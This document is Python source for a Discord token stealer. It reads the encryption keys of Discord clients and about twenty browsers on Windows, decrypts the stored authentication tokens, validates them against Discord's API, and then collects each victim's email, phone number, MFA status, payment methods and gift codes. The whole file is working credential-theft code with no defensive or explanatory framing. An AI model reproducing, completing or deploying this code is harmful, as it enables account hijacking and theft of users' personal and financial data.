import os
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import listdir
from json import loads
from re import findall
import requests
import json

tokens = []
cleaned = []
checker = []
checked = []
valid = []

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
paths = {
    'Discord': roaming + '\\discord',
    'Discord Canary': roaming + '\\discordcanary',
    'Lightcord': roaming + '\\Lightcord',
    'Discord PTB': roaming + '\\discordptb',
    'Opera': roaming + '\\Opera Software\\Opera Stable',
    'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
    'Amigo': local + '\\Amigo\\User Data',
    'Torch': local + '\\Torch\\User Data',
    'Kometa': local + '\\Kometa\\User Data',
    'Orbitum': local + '\\Orbitum\\User Data',
    'CentBrowser': local + '\\CentBrowser\\User Data',
    '7Star': local + '\\7Star\\7Star\\User Data',
    'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
    'Chrome': local + "\\Google\\Chrome\\User Data\\Default",
    'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
    'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': local + '\\Iridium\\User Data\\Default'
}

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"

for platform, path in paths.items():
    if not os.path.exists(path): 
        continue
    try:
        with open(path + f"\\Local State", "r") as file:
            key = loads(file.read())['os_crypt']['encrypted_key']
            file.close()
    except: 
        continue
    
    for file in listdir(path + f"\\Local Storage\\leveldb\\"):
        if not file.endswith(".ldb") and file.endswith(".log"): 
            continue
        else:
            try:
                with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                    for x in files.readlines():
                        x.strip()
                        for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                            tokens.append(values)
            except PermissionError: 
                continue
    
    for i in tokens:
        if i.endswith("\\"):
            i.replace("\\", "")
        elif i not in cleaned:
            cleaned.append(i)
    
    for token in cleaned:
        try:
            tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
        except (IndexError, ValueError):
            continue
        
        if tok == "Error":
            continue
            
        checker.append(tok)
        for value in checker:
            if value not in checked:
                checked.append(value)
                headers = {'Authorization': value, 'Content-Type': 'application/json'}
                try:
                    res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                except:
                    continue
                
                if res.status_code == 200:
                    valid.append(value)
                    
def get_valid_token_results():
    results_all = []
    for token in valid:
        results: list[dict] = []
        r: HTTPResponse = Discord.httpClient.request("GET", "https://discord.com/api/v9/users/@me", headers=Discord.GetHeaders(token.strip()))
        if r.status == 200:
            r = r.data.decode(errors="ignore")
            r = json.loads(r)
            user = r['username'] + '#' + str(r['discriminator'])
            id = r['id']
            email = r['email'].strip() if r['email'] else '(No Email)'
            phone = r['phone'] if r['phone'] else '(No Phone Number)'
            verified = r['verified']
            mfa = r['mfa_enabled']
            nitro_type = r.get('premium_type', 0)
            nitro_infos = {
                0: 'No Nitro',
                1: 'Nitro Classic',
                2: 'Nitro',
                3: 'Nitro Basic'
            }

            nitro_data = nitro_infos.get(nitro_type, '(Unknown)')

            billing = json.loads(Discord.httpClient.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.GetHeaders(token)).data.decode(errors="ignore"))
            if len(billing) == 0:
                billing = '(No Payment Method)'
            else:
                methods = {
                    'Card': 0,
                    'Paypal': 0,
                    'Unknown': 0,
                }
                for m in billing:
                    if not isinstance(m, dict):
                        continue
                    method_type = m.get('type', 0)

                    match method_type:
                        case 1:
                            methods['Card'] += 1
                        case 2:
                            methods['Paypal'] += 1
                        case _:
                            methods['Unknown'] += 1

                billing = ', '.join(['{} ({})'.format(name, quantity) for name, quantity in methods.items() if quantity != 0]) or 'None'
            
            gifts = list()
            r = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers=Discord.GetHeaders(token)).data.decode(errors="ignore")
            if 'code' in r:
                r = json.loads(r)
                for i in r:
                    if isinstance(i, dict):
                        code = i.get('code')
                        if i.get('promotion') is None or not isinstance(i['promotion'], dict):
                            continue
                        title = i['promotion'].get('outbound_title')
                        if code and title:
                            gifts.append(f'{title}: {code}')
            
            if len(gifts) == 0:
                gifts = 'Gift Codes: (NONE)'
            else:
                gifts = 'Gift Codes:\n\t' + '\n\t'.join(gifts)
            
            results.append({
                'USERNAME': user,
                'USERID': id,
                'MFA': mfa,
                'EMAIL': email,
                'PHONE': phone,
                'VERIFIED': verified,
                'NITRO': nitro_data,
                'BILLING': billing,
                'TOKEN': token,
                'GIFTS': gifts
            })
        
        results_all.extend(results)
    return results_all